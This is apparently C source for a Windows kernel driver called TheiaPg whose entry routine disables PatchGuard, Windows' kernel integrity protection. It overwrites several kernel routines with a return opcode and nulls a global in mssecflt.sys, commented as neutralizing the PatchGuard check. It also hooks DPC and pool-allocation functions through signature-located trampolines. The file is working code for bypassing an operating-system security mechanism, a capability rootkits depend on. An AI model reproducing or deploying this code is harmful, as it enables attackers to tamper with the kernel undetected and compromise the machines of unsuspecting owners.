#include "LinkHeader.h"

#define ALIGNMENT_ICT_KIEXECUTEALLDPCS 2UI8

#define ALIGNMENT_ICT_KIRETIREDPCLIST  0UI8

#define ALIGNMENT_ICT_EXALLOCATEPOOL2  0UI8

CONST UCHAR THEIA_ENTRY_DATA_KIEXECUTEALLDPCS_SUBSIG[] =
{
  0x4c,0x8d, 0x80, 0x2c, 0x01, 0x00, 0x00, // lea     r8, [rax+12Ch]
  0x4f, 0x8d, 0x04, 0x40,                  // lea     r8, [r8+r8*2]
  0x49, 0xc1, 0xe0, 0x04                   // shl     r8, 4
};
CONST UCHAR THEIA_ENTRY_DATA_KIEXECUTEALLDPCS_SUBSIG_MASK[sizeof THEIA_ENTRY_DATA_KIEXECUTEALLDPCS_SUBSIG] = { "xxxxxxxxxxxxxxx" };

CONST UCHAR THEIA_ENTRY_DATA_KIRETIREDPCLIST_SUBSIG[] =
{
  0x48, 0x8b, 0xd9,                         // mov     rbx, rcx
  0x48, 0x89, 0x4d, 0xb0,                   // mov     qword ptr[rbp - 50h], rcx
  0x48, 0x8d, 0x4d, 0xc4,                   // lea     rcx,[rbp - 3Ch]
  0x33, 0xd2                                // xor     edx, edx
};
CONST UCHAR THEIA_ENTRY_DATA_KIRETIREDPCLIST_SUBSIG_MASK[sizeof THEIA_ENTRY_DATA_KIRETIREDPCLIST_SUBSIG] = { "xxxxxxxxxxxxx" };

CONST UCHAR THEIA_ENTRY_DATA_EXALLOCATEPOOL2_SUBSIG[] =
{
  0x41, 0x5f,                              // pop     r15
  0x41, 0x5e,                              // pop     r14 
  0x41, 0x5d,                              // pop     r13
  0x41, 0x5c,                              // pop     r12
  0x5f,                                    // pop     rdi
  0x5e,                                    // pop     rsi
  0x5d,                                    // pop     rbp
  0xc3                                     // ret
};
CONST UCHAR THEIA_ENTRY_DATA_EXALLOCATEPOOL2_SUBSIG_MASK[sizeof THEIA_ENTRY_DATA_EXALLOCATEPOOL2_SUBSIG] = { "xxxxxxxxxxxx" };
    
/**
* Routine: TheiaEntry
*
* MaxIRQL: DISPATCH_LEVEL
*
* Public/Private: Public
*
* @param NoParams
*
* Description: MainEntry routine.
*/
VOID TheiaEntry(VOID)
{
    #define ERROR_THEIA_ENTRY 0xd1baa81aUI32

    CONST UCHAR HandlerVsrKiExecuteAllDpcs[] =
    {
       0x4c,0x8d, 0x80, 0x2c, 0x01, 0x00, 0x00, // lea     r8, [rax+12Ch]
       0x4f, 0x8d, 0x04, 0x40,                  // lea     r8, [r8+r8*2]
       0x49, 0xc1, 0xe0, 0x04                   // shl     r8, 4
    };

    CONST UCHAR HandlerVsrKiRetireDpcList[] =
    {
      0x48, 0x8b, 0xd9,                         // mov     rbx, rcx
      0x48, 0x89, 0x4d, 0xb0,                   // mov     qword ptr[rbp - 50h], rcx
      0x48, 0x8d, 0x4d, 0xc4,                   // lea     rcx,[rbp - 3Ch]
      0x33, 0xd2                                // xor     edx, edx
    };

    CONST UCHAR HandlerVsrExAllocatePool2[] =
    {     
       0x48, 0x83, 0xc4, 0x10,                  // add     rsp, 010h
       0x41, 0x5f,                              // pop     r15
       0x41, 0x5e,                              // pop     r14 
       0x41, 0x5d,                              // pop     r13
       0x41, 0x5c,                              // pop     r12
       0x5f,                                    // pop     rdi
       0x5e,                                    // pop     rsi
       0x5d,                                    // pop     rbp
       0xc3                                     // ret
    };

    CONST UCHAR HandlerVsrKiCustomRecurseRoutineX[] =
    {
      0x48, 0x89, 0xc4,                         // mov    rsp,rax
      0xff, 0xe1,                               // jmp    rcx
      0xcc,                                     // int3
      0xcc,                                     // int3
      0xcc                                      // int3
    };

    CONST UCHAR RetOpcode = 0xC3UI8;
  
    CONST UCHAR StopSig[3] = { 0xCC,0xCC,0xCC };

    ICT_DATA_RELATED RelatedDataICT = { 0 };

    INDPN_RW_V_MEMORY_DATA DataIndpnRWVMem = { 0 };

    DataIndpnRWVMem.FlagsExecute = MEM_INDPN_RW_WRITE_OP_BIT;

    DataIndpnRWVMem.pIoBuffer = &RetOpcode;

    DataIndpnRWVMem.LengthRW = 1UI64;

    InitTheiaContext();

    DataIndpnRWVMem.pVa = g_pTheiaCtx->pKiMcaDeferredRecoveryService;;
    
    DbgLog("[TheiaPg <+>] TheiaEntry: FixKiMcaDeferredRecoveryService\n");
    
    HrdIndpnRWVMemory(&DataIndpnRWVMem);
    
    DataIndpnRWVMem.pVa = g_pTheiaCtx->pFsRtlUninitializeSmallMcb;

    DbgLog("[TheiaPg <+>] TheiaEntry: FixFsRtlUninitializeSmallMcb\n");

    HrdIndpnRWVMemory(&DataIndpnRWVMem);

    DataIndpnRWVMem.pVa = g_pTheiaCtx->pFsRtlTruncateSmallMcb;
    
    DbgLog("[TheiaPg <+>] TheiaEntry: FixFsRtlTruncateSmallMcb\n");
    
    HrdIndpnRWVMemory(&DataIndpnRWVMem);
    
    DataIndpnRWVMem.pVa = g_pTheiaCtx->pKiDecodeMcaFault;
    
    DbgLog("[TheiaPg <+>] TheiaEntry: FixKiDecodeMcaFault\n");
    
    HrdIndpnRWVMemory(&DataIndpnRWVMem);
    
    DataIndpnRWVMem.pVa = g_pTheiaCtx->pCcBcbProfiler;
    
    DbgLog("[TheiaPg <+>] TheiaEntry: FixCcBcbProfiler\n");
    
    HrdIndpnRWVMemory(&DataIndpnRWVMem);
    
    DataIndpnRWVMem.pVa = g_pTheiaCtx->pCcBcbProfiler2;
    
    DbgLog("[TheiaPg <+>] TheiaEntry: FixCcBcbProfiler2\n");
    
    HrdIndpnRWVMemory(&DataIndpnRWVMem);
    
    DataIndpnRWVMem.pVa = g_pTheiaCtx->pKiDispatchCallout;
    
    DbgLog("[TheiaPg <+>] TheiaEntry: FixKiDispatchCallout\n");
    
    HrdIndpnRWVMemory(&DataIndpnRWVMem);
    
    DataIndpnRWVMem.pVa = g_pTheiaCtx->pKiSwInterruptDispatch;
    
    DbgLog("[TheiaPg <+>] TheiaEntry: FixKiSwInterruptDispatch\n");
    
    HrdIndpnRWVMemory(&DataIndpnRWVMem);
    
    DbgLog("[TheiaPg <+>] TheiaEntry: FixMaxDataSize\n");
    
    //
    // Nulling gMaxDataSize is necessary to neutralize the PG check routine,
    // which is called through a global pointer in the kernel module mssecflt.sys and checks MaxDataSize is NULL, if NULL is detected
    // then the execution of the check routine logically jump to epilog, unlike KiSwInterruptDispatch.
    //
    *(PULONG64)g_pTheiaCtx->ppMaxDataSize = NULL; ///< pp: pointer to pointer.
    
    DbgLog("[TheiaPg <+>] TheiaEntry: FixPgPrcbFields\n");
    
    g_pTheiaCtx->pKeIpiGenericCall(&SearchKdpcInPgPrcbFields, NULL);
    
    RelatedDataICT.pHookRoutine = &VsrKiExecuteAllDpcs;
    RelatedDataICT.pBasePatch = _SearchPatternInRegion(NULL, SPIR_NO_OPTIONAL, g_pTheiaCtx->pKiExecuteAllDpcs, THEIA_ENTRY_DATA_KIEXECUTEALLDPCS_SUBSIG, THEIA_ENTRY_DATA_KIEXECUTEALLDPCS_SUBSIG_MASK, &StopSig, sizeof StopSig);
    
    if (!RelatedDataICT.pBasePatch)
    {
        DbgLog("[TheiaPg <->] TheiaEntry: Base for Call-Trampoline VsrKiExecuteAllDpcs not found\n");
    
        DieDispatchIntrnlError(ERROR_THEIA_ENTRY);
    }
    
    RelatedDataICT.pHandlerHook = &HandlerVsrKiExecuteAllDpcs;
    RelatedDataICT.LengthHandler = sizeof HandlerVsrKiExecuteAllDpcs;
    RelatedDataICT.LengthAlignment = ALIGNMENT_ICT_KIEXECUTEALLDPCS;
    
    HkInitCallTrmpln(&RelatedDataICT);
    
    DbgLog("[TheiaPg <+>] TheiaEntry: VsrKiExecuteAllDpcs is init\n");
    
    RelatedDataICT.pHookRoutine = &VsrKiRetireDpcList;
    RelatedDataICT.pBasePatch = _SearchPatternInRegion(NULL, SPIR_NO_OPTIONAL, g_pTheiaCtx->pKiRetireDpcList, THEIA_ENTRY_DATA_KIRETIREDPCLIST_SUBSIG, THEIA_ENTRY_DATA_KIRETIREDPCLIST_SUBSIG_MASK, &StopSig, sizeof StopSig);
    
    if (!RelatedDataICT.pBasePatch)
    {
        DbgLog("[TheiaPg <->] TheiaEntry: Base for Call-Trampoline VsrKiRetireDpcList not found\n");
    
        DieDispatchIntrnlError(ERROR_THEIA_ENTRY);
    }
    
    RelatedDataICT.pHandlerHook = &HandlerVsrKiRetireDpcList;
    RelatedDataICT.LengthHandler = sizeof HandlerVsrKiRetireDpcList;
    RelatedDataICT.LengthAlignment = ALIGNMENT_ICT_KIRETIREDPCLIST;
    
    HkInitCallTrmpln(&RelatedDataICT);
    
    DbgLog("[TheiaPg <+>] TheiaEntry: VsrKiRetireDpcList is init\n");
    
    RelatedDataICT.pHookRoutine = &VsrExAllocatePool2; 
    RelatedDataICT.pBasePatch = _SearchPatternInRegion(NULL, SPIR_NO_OPTIONAL, g_pTheiaCtx->pExAllocatePool2, THEIA_ENTRY_DATA_EXALLOCATEPOOL2_SUBSIG, THEIA_ENTRY_DATA_EXALLOCATEPOOL2_SUBSIG_MASK, &StopSig, sizeof StopSig);
    
    if (!RelatedDataICT.pBasePatch)
    {
        DbgLog("[TheiaPg <->] TheiaEntry: Base for Call-Trampoline VsrExAllocatePool2 not found\n");
    
        DieDispatchIntrnlError(ERROR_THEIA_ENTRY);
    }
    
    RelatedDataICT.pHandlerHook = &HandlerVsrExAllocatePool2;
    RelatedDataICT.LengthHandler = sizeof HandlerVsrExAllocatePool2;
    RelatedDataICT.LengthAlignment = ALIGNMENT_ICT_EXALLOCATEPOOL2;
    
    HkInitCallTrmpln(&RelatedDataICT);
    
    DbgLog("[TheiaPg <+>] TheiaEntry: VsrExAllocatePool2 is init\n");
    
    do
    {
        LONG32 SaveRel32Offset = 0I32;
    
        PVOID pCurrentRecurseRoutine = NULL;
    
        for (BOOLEAN i = FALSE; ; )
        {
            if (!i)
            {
                i = TRUE;
    
                RelatedDataICT.pHookRoutine = &VsrKiCustomRecurseRoutineX;
                RelatedDataICT.pBasePatch = ((PUCHAR)g_pTheiaCtx->pKiCustomRecurseRoutineX + 4);
                RelatedDataICT.pHandlerHook = &HandlerVsrKiCustomRecurseRoutineX;
                RelatedDataICT.LengthHandler = sizeof HandlerVsrKiCustomRecurseRoutineX;
                RelatedDataICT.LengthAlignment = 0UI32;
    
                pCurrentRecurseRoutine = g_pTheiaCtx->pKiCustomRecurseRoutineX;
    
                SaveRel32Offset = *(PLONG32)((PUCHAR)pCurrentRecurseRoutine + 9);
    
                pCurrentRecurseRoutine = (PVOID)(((ULONG64)pCurrentRecurseRoutine + 13) + ((SaveRel32Offset < 0I32) ? ((ULONG64)SaveRel32Offset | 0xffffffff00000000UI64) : (ULONG64)SaveRel32Offset));
            }
            else
            {
                if (pCurrentRecurseRoutine == g_pTheiaCtx->pKiCustomRecurseRoutineX) { break; }
    
                RelatedDataICT.pBasePatch = ((PUCHAR)pCurrentRecurseRoutine + 4);
    
                SaveRel32Offset = *(PLONG32)((PUCHAR)pCurrentRecurseRoutine + 9);
    
                pCurrentRecurseRoutine = (PVOID)(((ULONG64)pCurrentRecurseRoutine + 13) + ((SaveRel32Offset < 0I32) ? ((ULONG64)SaveRel32Offset | 0xffffffff00000000UI64) : (ULONG64)SaveRel32Offset));
            }
    
            HkInitCallTrmpln(&RelatedDataICT);
        };
    
        DbgLog("[TheiaPg <+>] TheiaEntry: VsrKiCustomRecurseRoutineX is init\n\n");
    
    } while (FALSE);

    InitSearchPgSysThread(); ///< Calling initalizer sys-threads-walk.

    return;
}
